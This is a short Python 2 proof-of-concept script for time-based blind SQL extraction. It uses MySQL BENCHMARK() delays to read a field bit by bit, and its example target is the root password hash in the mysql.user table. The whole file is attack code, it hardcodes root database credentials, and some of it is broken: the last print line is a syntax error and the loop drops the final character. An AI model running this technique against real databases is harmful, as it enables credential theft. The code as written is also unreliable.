#!/usr/bin/env python
#
# Blind SQL extraction POC
# Author Dario Clavijo 2015

import time,sys,os

import MySQLdb

db = MySQLdb.connect(host="localhost",user="root", passwd="password", db="mysql") # name of the data base

cur = db.cursor() 

def measure(sql):
	s_time = time.time();
	cur.execute(sql)
	e_time = time.time();
	d_time = e_time - s_time
	return d_time

def getlength(field,table,where):
	accum = 0

	mintime = 1
	
	for bitpos in [128,64,32,16,8,4,2,1]:
		sql = "select if(length(%s) & %d,benchmark(50000000,md5('cc')),0) from %s where %s;" % (field,bitpos,table,where)
		_time = measure(sql)

		if _time > mintime:
			bit = 1
			accum += bitpos
		else:
			bit = 0
		print "time:",_time,",bit:",bit

		
	
	return accum

def getbits(pos,field,table,where):
	accum = 0

	mintime = 1
	
	for bitpos in [128,64,32,16,8,4,2,1]:

		sql = "select if(ord(substring(%s,%d,1)) & %d,benchmark(50000000,md5('cc')),0) from %s where %s;" % (field,pos,bitpos,table,where) 
		_time = measure(sql)
		
		if _time > mintime:
			bit = 1
			accum += bitpos
		else:
			bit = 0
		print "time:",_time,",bit:",bit
		
	
	return accum


def getdata(field,table,where):
	tmp = ""
	length = getlength(field,table,where)
	print "length: ",length
	for i in range(1,length):
		c = chr(getbits(i,field,table,where))
		print "CHAR: '%s'" % c
		tmp += c
	return tmp

# example against mysql users table

print "RECOVERED DATA: "getdata('password','user',"user='root' limit 1")
